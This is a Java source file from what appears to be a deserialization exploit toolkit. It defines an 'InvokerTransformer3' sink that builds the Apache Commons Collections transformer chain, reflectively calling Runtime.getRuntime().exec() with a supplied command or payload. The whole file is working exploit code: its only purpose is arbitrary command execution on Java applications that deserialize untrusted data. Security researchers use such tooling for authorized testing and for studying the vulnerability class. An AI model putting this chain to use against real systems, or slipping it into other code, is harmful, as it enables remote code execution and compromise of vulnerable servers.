package com.ppp.sinks;

import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

/**
 * @author Whoopsunix
 */
@Sink({Sink.InvokerTransformer3})
public class InvokerTransformer3 {
    /**
     * 命令执行
     */
    @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
    public Transformer[] runtime(SinksHelper sinksHelper) {
        String command = sinksHelper.getCommand();

        return new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{command}),
                new ConstantTransformer(1)};
    }

    public Transformer[] runtime(String payload) {
        return new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{payload}),
                new ConstantTransformer(1)};
    }
}
